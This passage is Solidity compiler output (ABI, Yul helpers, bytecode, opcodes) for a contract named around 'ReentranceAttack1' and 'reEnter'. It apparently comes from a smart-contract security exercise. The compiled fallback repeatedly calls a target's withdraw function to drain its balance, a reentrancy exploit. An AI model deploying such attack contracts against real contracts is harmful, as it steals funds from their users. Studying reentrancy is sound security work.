payable","name":"_target","type":"address"}],"stateMutability":"payable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"ReentranceAttack1","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reEnter","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_2042":{"entryPoint":null,"id":2042,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address_payable_fromMemory":{"entryPoint":250,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address_payable_fromMemory":{"entryPoint":271,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"cleanup_t_address_payable":{"entryPoint":209,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":177,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":172,"id":null,"parameterSlots":0,"returnSlots":0},"validator_revert_t_address_payable":{"entryPoint":227,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:1255:10","nodeType":"YulBlock","src":"0:1255:10","statements":[{"body":{"nativeSrc":"47:35:10","nodeType":"YulBlock","src":"47:35:10","statements":[{"nativeSrc":"57:19:10","nodeType":"YulAssignment","src":"57:19:10","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:10","nodeType":"YulLiteral","src":"73:2:10","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:10","nodeType":"YulIdentifier","src":"67:5:10"},"nativeSrc":"67:9:10","nodeType":"YulFunctionCall","src":"67:9:10"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:10","nodeType":"YulIdentifier","src":"57:6:10"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:10","nodeType":"YulTypedName","src":"40:6:10","type":""}],"src":"7:75:10"},{"body":{"nativeSrc":"177:28:10","nodeType":"YulBlock","src":"177:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:10","nodeType":"YulLiteral","src":"194:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:10","nodeType":"YulLiteral","src":"197:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:10","nodeType":"YulIdentifier","src":"187:6:10"},"nativeSrc":"187:12:10","nodeType":"YulFunctionCall","src":"187:12:10"},"nativeSrc":"187:12:10","nodeType":"YulExpressionStatement","src":"187:12:10"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:10","nodeType":"YulFunctionDefinition","src":"88:117:10"},{"body":{"nativeSrc":"300:28:10","nodeType":"YulBlock","src":"300:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:10","nodeType":"YulLiteral","src":"317:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:10","nodeType":"YulLiteral","src":"320:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:10","nodeType":"YulIdentifier","src":"310:6:10"},"nativeSrc":"310:12:10","nodeType":"YulFunctionCall","src":"310:12:10"},"nativeSrc":"310:12:10","nodeType":"YulExpressionStatement","src":"310:12:10"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:10","nodeType":"YulFunctionDefinition","src":"211:117:10"},{"body":{"nativeSrc":"379:81:10","nodeType":"YulBlock","src":"379:81:10","statements":[{"nativeSrc":"389:65:10","nodeType":"YulAssignment","src":"389:65:10","value":{"arguments":[{"name":"value","nativeSrc":"404:5:10","nodeType":"YulIdentifier","src":"404:5:10"},{"kind":"number","nativeSrc":"411:42:10","nodeType":"YulLiteral","src":"411:42:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"400:3:10","nodeType":"YulIdentifier","src":"400:3:10"},"nativeSrc":"400:54:10","nodeType":"YulFunctionCall","src":"400:54:10"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:10","nodeType":"YulIdentifier","src":"389:7:10"}]}]},"name":"cleanup_t_uint160","nativeSrc":"334:126:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:10","nodeType":"YulTypedName","src":"361:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:10","nodeType":"YulTypedName","src":"371:7:10","type":""}],"src":"334:126:10"},{"body":{"nativeSrc":"519:51:10","nodeType":"YulBlock","src":"519:51:10","statements":[{"nativeSrc":"529:35:10","nodeType":"YulAssignment","src":"529:35:10","value":{"arguments":[{"name":"value","nativeSrc":"558:5:10","nodeType":"YulIdentifier","src":"558:5:10"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"540:17:10","nodeType":"YulIdentifier","src":"540:17:10"},"nativeSrc":"540:24:10","nodeType":"YulFunctionCall","src":"540:24:10"},"variableNames":[{"name":"cleaned","nativeSrc":"529:7:10","nodeType":"YulIdentifier","src":"529:7:10"}]}]},"name":"cleanup_t_address_payable","nativeSrc":"466:104:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"501:5:10","nodeType":"YulTypedName","src":"501:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"511:7:10","nodeType":"YulTypedName","src":"511:7:10","type":""}],"src":"466:104:10"},{"body":{"nativeSrc":"627:87:10","nodeType":"YulBlock","src":"627:87:10","statements":[{"body":{"nativeSrc":"692:16:10","nodeType":"YulBlock","src":"692:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"701:1:10","nodeType":"YulLiteral","src":"701:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"704:1:10","nodeType":"YulLiteral","src":"704:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"694:6:10","nodeType":"YulIdentifier","src":"694:6:10"},"nativeSrc":"694:12:10","nodeType":"YulFunctionCall","src":"694:12:10"},"nativeSrc":"694:12:10","nodeType":"YulExpressionStatement","src":"694:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"650:5:10","nodeType":"YulIdentifier","src":"650:5:10"},{"arguments":[{"name":"value","nativeSrc":"683:5:10","nodeType":"YulIdentifier","src":"683:5:10"}],"functionName":{"name":"cleanup_t_address_payable","nativeSrc":"657:25:10","nodeType":"YulIdentifier","src":"657:25:10"},"nativeSrc":"657:32:10","nodeType":"YulFunctionCall","src":"657:32:10"}],"functionName":{"name":"eq","nativeSrc":"647:2:10","nodeType":"YulIdentifier","src":"647:2:10"},"nativeSrc":"647:43:10","nodeType":"YulFunctionCall","src":"647:43:10"}],"functionName":{"name":"iszero","nativeSrc":"640:6:10","nodeType":"YulIdentifier","src":"640:6:10"},"nativeSrc":"640:51:10","nodeType":"YulFunctionCall","src":"640:51:10"},"nativeSrc":"637:71:10","nodeType":"YulIf","src":"637:71:10"}]},"name":"validator_revert_t_address_payable","nativeSrc":"576:138:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"620:5:10","nodeType":"YulTypedName","src":"620:5:10","type":""}],"src":"576:138:10"},{"body":{"nativeSrc":"791:88:10","nodeType":"YulBlock","src":"791:88:10","statements":[{"nativeSrc":"801:22:10","nodeType":"YulAssignment","src":"801:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"816:6:10","nodeType":"YulIdentifier","src":"816:6:10"}],"functionName":{"name":"mload","nativeSrc":"810:5:10","nodeType":"YulIdentifier","src":"810:5:10"},"nativeSrc":"810:13:10","nodeType":"YulFunctionCall","src":"810:13:10"},"variableNames":[{"name":"value","nativeSrc":"801:5:10","nodeType":"YulIdentifier","src":"801:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"867:5:10","nodeType":"YulIdentifier","src":"867:5:10"}],"functionName":{"name":"validator_revert_t_address_payable","nativeSrc":"832:34:10","nodeType":"YulIdentifier","src":"832:34:10"},"nativeSrc":"832:41:10","nodeType":"YulFunctionCall","src":"832:41:10"},"nativeSrc":"832:41:10","nodeType":"YulExpressionStatement","src":"832:41:10"}]},"name":"abi_decode_t_address_payable_fromMemory","nativeSrc":"720:159:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"769:6:10","nodeType":"YulTypedName","src":"769:6:10","type":""},{"name":"end","nativeSrc":"777:3:10","nodeType":"YulTypedName","src":"777:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"785:5:10","nodeType":"YulTypedName","src":"785:5:10","type":""}],"src":"720:159:10"},{"body":{"nativeSrc":"970:282:10","nodeType":"YulBlock","src":"970:282:10","statements":[{"body":{"nativeSrc":"1016:83:10","nodeType":"YulBlock","src":"1016:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"1018:77:10","nodeType":"YulIdentifier","src":"1018:77:10"},"nativeSrc":"1018:79:10","nodeType":"YulFunctionCall","src":"1018:79:10"},"nativeSrc":"1018:79:10","nodeType":"YulExpressionStatement","src":"1018:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"991:7:10","nodeType":"YulIdentifier","src":"991:7:10"},{"name":"headStart","nativeSrc":"1000:9:10","nodeType":"YulIdentifier","src":"1000:9:10"}],"functionName":{"name":"sub","nativeSrc":"987:3:10","nodeType":"YulIdentifier","src":"987:3:10"},"nativeSrc":"987:23:10","nodeType":"YulFunctionCall","src":"987:23:10"},{"kind":"number","nativeSrc":"1012:2:10","nodeType":"YulLiteral","src":"1012:2:10","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"983:3:10","nodeType":"YulIdentifier","src":"983:3:10"},"nativeSrc":"983:32:10","nodeType":"YulFunctionCall","src":"983:32:10"},"nativeSrc":"980:119:10","nodeType":"YulIf","src":"980:119:10"},{"nativeSrc":"1109:136:10","nodeType":"YulBlock","src":"1109:136:10","statements":[{"nativeSrc":"1124:15:10","nodeType":"YulVariableDeclaration","src":"1124:15:10","value":{"kind":"number","nativeSrc":"1138:1:10","nodeType":"YulLiteral","src":"1138:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1128:6:10","nodeType":"YulTypedName","src":"1128:6:10","type":""}]},{"nativeSrc":"1153:82:10","nodeType":"YulAssignment","src":"1153:82:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1207:9:10","nodeType":"YulIdentifier","src":"1207:9:10"},{"name":"offset","nativeSrc":"1218:6:10","nodeType":"YulIdentifier","src":"1218:6:10"}],"functionName":{"name":"add","nativeSrc":"1203:3:10","nodeType":"YulIdentifier","src":"1203:3:10"},"nativeSrc":"1203:22:10","nodeType":"YulFunctionCall","src":"1203:22:10"},{"name":"dataEnd","nativeSrc":"1227:7:10","nodeType":"YulIdentifier","src":"1227:7:10"}],"functionName":{"name":"abi_decode_t_address_payable_fromMemory","nativeSrc":"1163:39:10","nodeType":"YulIdentifier","src":"1163:39:10"},"nativeSrc":"1163:72:10","nodeType":"YulFunctionCall","src":"1163:72:10"},"variableNames":[{"name":"value0","nativeSrc":"1153:6:10","nodeType":"YulIdentifier","src":"1153:6:10"}]}]}]},"name":"abi_decode_tuple_t_address_payable_fromMemory","nativeSrc":"885:367:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"940:9:10","nodeType":"YulTypedName","src":"940:9:10","type":""},{"name":"dataEnd","nativeSrc":"951:7:10","nodeType":"YulTypedName","src":"951:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"963:6:10","nodeType":"YulTypedName","src":"963:6:10","type":""}],"src":"885:367:10"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address_payable(value) {\n        if iszero(eq(value, cleanup_t_address_payable(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_payable_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address_payable(value)\n    }\n\n    function abi_decode_tuple_t_address_payable_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_payable_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n","id":10,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"60806040526040516103af3803806103af8339818101604052810190610025919061010f565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b6102648061014b6000396000f3fe60806040526004361061002d5760003560e01c80630ec39463146100f9578063fcd36e9c146101105761002e565b5b5b6103e8600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156100f75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b5050505061002f565b005b34801561010557600080fd5b5061010e610127565b005b34801561011c57600080fd5b506101256101a9565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561018f57600080fd5b505af11580156101a3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631f8cdb04610bb86040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021357600080fd5b505af1158015610227573d6000803e3d6000fd5b505050505056fea26469706673582212207ddfdd3632b45fe955f102e0686cf2bc9dd08417d3bd655787a1dc462acbf64064736f6c63430008150033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x3AF CODESIZE SUB DUP1 PUSH2 0x3AF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x10F JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x13C JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDC DUP3 PUSH2 0xB1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xEC DUP2 PUSH2 0xD1 JUMP JUMPDEST DUP2 EQ PUSH2 0xF7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x109 DUP2 PUSH2 0xE3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x125 JUMPI PUSH2 0x124 PUSH2 0xAC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x133 DUP5 DUP3 DUP6 ADD PUSH2 0xFA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x264 DUP1 PUSH2 0x14B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xEC39463 EQ PUSH2 0xF9 JUMPI DUP1 PUSH4 0xFCD36E9C EQ PUSH2 0x110 JUMPI PUSH2 0x2E JUMP JUMPDEST JUMPDEST JUMPDEST PUSH2 0x3E8 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0xF7 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12210E8A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x2F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x10E PUSH2 0x127 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x11C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x125 PUSH2 0x1A9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12210E8A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x18F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1F8CDB04 PUSH2 0xBB8 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x213 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x227 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH30 0xDFDD3632B45FE955F102E0686CF2BC9DD08417D3BD655787A1DC462ACBF6 BLOCKHASH PUSH5 0x736F6C6343 STOP ADDMOD ISZERO STOP CALLER ","sourceMap":"105:529:9:-:0;;;185:119;;;;;;;;;;;;;;;;;;;;;:::i;:::-;262:7;239:6;;:31;;;;;;;;;;;;;;;;;;290:7;280;;:17;;;;;;;;;;;;;;;;;;185:119;105:529;;88:117:10;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:104::-;511:7;540:24;558:5;540:24;:::i;:::-;529:35;;466:104;;;:::o;576:138::-;657:32;683:5;657:32;:::i;:::-;650:5;647:43;637:71;;704:1;701;694:12;637:71;576:138;:::o;720:159::-;785:5;816:6;810:13;801:22;;832:41;867:5;832:41;:::i;:::-;720:159;;;;:::o;885:367::-;963:6;1012:2;1000:9;991:7;987:23;983:32;980:119;;;1018:79;;:::i;:::-;980:119;1138:1;1163:72;1227:7;1218:6;1207:9;1203:22;1163:72;:::i;:::-;1153:82;;1109:136;885:367;;;;:::o;105:529:9:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@ReentranceAttack1_2071":{"entryPoint":425,"id":2071,"parameterSlots":0,"returnSlots":0},"@_2060":{"entryPoint":null,"id":2060,"parameterSlots":0,"returnSlots":0},"@reEnter_2080":{"entryPoint":295,"id":2080,"parameterSlots":0,"returnSlots":0}},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"60806040526004361061002d5760003560e01c80630ec39463146100f9578063fcd36e9c146101105761002e565b5b5b6103e8600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156100f75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b5050505061002f565b005b34801561010557600080fd5b5061010e610127565b005b34801561011c57600080fd5b506101256101a9565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561018f57600080fd5b505af11580156101a3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631f8cdb04610bb86040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021357600080fd5b505af1158015610227573d6000803e3d6000fd5b505050505056fea26469706673582212207ddfdd3632b45fe955f102e0686cf2bc9dd08417d3bd655787a1dc462acbf64064736f6c63430008150033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xEC39463 EQ PUSH2 0xF9 JUMPI DUP1 PUSH4 0xFCD36E9C EQ PUSH2 0x110 JUMPI PUSH2 0x2E JUMP JUMPDEST JUMPDEST JUMPDEST PUSH2 0x3E8 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0xF7 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12210E8A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x2F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x10E PUSH2 0x127 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x11C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x125 PUSH2 0x1A9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12210E8A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x18F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1F8CDB04 PUSH2 0xBB8 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x213 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x227 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH30 0xDFDD3632B45FE955F102E0686CF2BC9DD08417D3BD655787A1DC462ACBF6 BLOCKHASH PUSH5 0x736F6C6343 STOP ADDMOD ISZERO STOP CALLER 